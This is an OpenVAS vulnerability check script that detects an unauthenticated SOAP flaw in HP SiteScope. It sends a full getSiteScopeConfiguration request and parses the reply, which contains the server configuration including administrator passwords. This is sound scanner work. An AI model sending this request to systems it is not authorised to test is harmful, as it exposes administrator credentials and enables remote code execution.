###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sitescope_getSiteScopeConfiguration.nasl 13793 2019-02-20 13:34:18Z cfischer $
#
# HP SiteScope SOAP Call getSiteScopeConfiguration Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:hp:sitescope";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103603");
  script_version("$Revision: 13793 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("HP SiteScope SOAP Call getSiteScopeConfiguration Remote Code Execution Vulnerability");
  script_tag(name:"last_modification", value:"$Date: 2019-02-20 14:34:18 +0100 (Wed, 20 Feb 2019) $");
  script_tag(name:"creation_date", value:"2012-11-05 18:35:36 +0100 (Mon, 05 Nov 2012)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("gb_hp_sitescope_detect.nasl");
  script_mandatory_keys("hp/sitescope/installed");
  script_require_ports("Services/www", 8080);

  script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-12-173/");
  script_xref(name:"URL", value:"http://www.hp.com/");

  script_tag(name:"summary", value:"This vulnerability allows remote attackers to execute arbitrary code on
  vulnerable installations of HP SiteScope. Authentication is not required to exploit this vulnerability.");

  script_tag(name:"insight", value:"The specific flaw exists because HP SiteScope allows unauthenticated SOAP calls to be made to the SiteScope
  service. One of those calls is getSiteScopeConfiguration() which will return the current configuration of the
  server including the administrator login and password information.");

  script_tag(name:"impact", value:"A remote attacker could abuse this vulnerability to login to SiteScope with administrative privileges then
  execute arbitrary code through the underlying functionality.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

useragent = http_get_user_agent();
host = http_host_name(port:port);

req = string("POST ", dir, "/services/APISiteScopeImpl HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             'SOAPAction: ""', "\r\n",
             "Content-Type: text/xml; charset=UTF-8\r\n",
             "Content-Length: 441\r\n",
             "\r\n",
             "<?xml version='1.0' encoding='UTF-8'?>\r\n",
             "<wsns0:Envelope\r\n",
             "xmlns:wsns1='http://www.w3.org/2001/XMLSchema-instance'\r\n",
             "xmlns:xsd='http://www.w3.org/2001/XMLSchema'\r\n",
             "xmlns:wsns0='http://schemas.xmlsoap.org/soap/envelope/'\r\n",
             ">\r\n",
             "<wsns0:Body\r\n",
             "wsns0:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'\r\n",
             ">\r\n",
             "<impl:getSiteScopeConfiguration\r\n",
             "xmlns:impl='http://Api.freshtech.COM'\r\n",
             "></impl:getSiteScopeConfiguration>\r\n",
             "</wsns0:Body>\r\n",
             "</wsns0:Envelope>");
result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
if(!result || result !~ "HTTP/1.. 200")
  exit(0);

cid = eregmatch(pattern:'getSiteScopeConfigurationReturn href="cid:([A-F0-9]*)"', string:result);
if(isnull(cid[1]))
  exit(0);

cid = cid[1];

boundary = eregmatch(pattern:'Content-Type:.*boundary="([^"]+)"', string:result);
if(isnull(boundary[1]))
  exit(0);

boundary = boundary[1];

content = split(result, sep:'<' + cid + '>\r\n\r\n', keep:FALSE);
content = content[1];
content = split(content, sep:'\r\n--' + boundary, keep:FALSE);

if(isnull(content[0]))
  exit(0);

res = gunzip(data:content[0]);
if("SiteScope" >< res && "_passwordt" >< res && "java.util.HashMap" >< res) {
  security_message(port:port);
  exit(0);
}

exit(99);